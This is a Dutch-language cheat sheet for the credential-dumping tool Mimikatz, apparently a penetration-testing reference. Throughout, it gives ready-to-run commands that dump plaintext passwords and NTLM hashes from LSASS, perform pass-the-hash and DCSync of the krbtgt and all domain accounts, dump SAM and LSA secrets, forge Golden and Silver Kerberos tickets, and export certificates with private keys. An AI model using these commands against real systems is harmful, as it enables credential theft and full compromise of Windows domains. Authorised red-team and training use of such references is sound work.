# Mimikatz — Credential dumping & Kerberos manipulatie
# Extraheert wachtwoorden, hashes, tickets en certificaten uit Windows geheugen
#
# === Syntax ===
# mimikatz.exe "commando1" "commando2" "exit"
#
# === Belangrijkste commando's ===
# privilege::debug              Verkrijg debug privilege (vereist voor meeste acties)
# token::elevate                Elevate naar SYSTEM token
# sekurlsa::logonpasswords      Dump alle plaintext wachtwoorden/hashes uit LSASS
# sekurlsa::pth                 Pass-the-Hash: start proces met NTLM hash
# lsadump::dcsync               DCSync: dump hashes via AD replicatie (Domain Admin nodig)
# lsadump::sam                  Dump SAM database (lokale accounts)
# lsadump::lsa /patch           Dump LSA secrets
# kerberos::golden              Maak Golden Ticket (krbtgt hash nodig)
# kerberos::ptt                 Pass-the-Ticket: injecteer .kirbi ticket
# kerberos::list                Toon gecachede Kerberos tickets
# crypto::certificates          Exporteer certificaten uit certificate store
#
# === Voorbeelden ===

# Stap 1: debug privilege verkrijgen
mimikatz.exe "privilege::debug" "exit"

# Plaintext wachtwoorden en NTLM hashes dumpen
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Pass-the-Hash — start cmd.exe als USER met NTLM hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd.exe" "exit"

# DCSync — dump specifieke gebruiker (vereist Replicating Directory Changes)
mimikatz.exe "lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt" "exit"
mimikatz.exe "lsadump::dcsync /domain:DOMAIN /user:DOMAIN\Administrator" "exit"

# DCSync — dump alle accounts
mimikatz.exe "lsadump::dcsync /domain:DOMAIN /all /csv" "exit"

# SAM database dumpen (lokale hashes)
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Golden Ticket aanmaken en injecteren
mimikatz.exe "kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /ptt" "exit"

# Silver Ticket voor specifieke service
mimikatz.exe "kerberos::golden /user:USER /domain:DOMAIN /sid:S-1-5-21-... /target:TARGET /service:cifs /rc4:HASH /ptt" "exit"

# Ticket exporteren en importeren
mimikatz.exe "kerberos::list /export" "exit"
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# Certificaten exporteren (private keys)
mimikatz.exe "crypto::capi" "crypto::certificates /systemstore:local_machine /export" "exit"

# NOTE: Vereist admin/SYSTEM voor de meeste commando's
# NOTE: sekurlsa commando's vereisen LSASS toegang (privilege::debug)
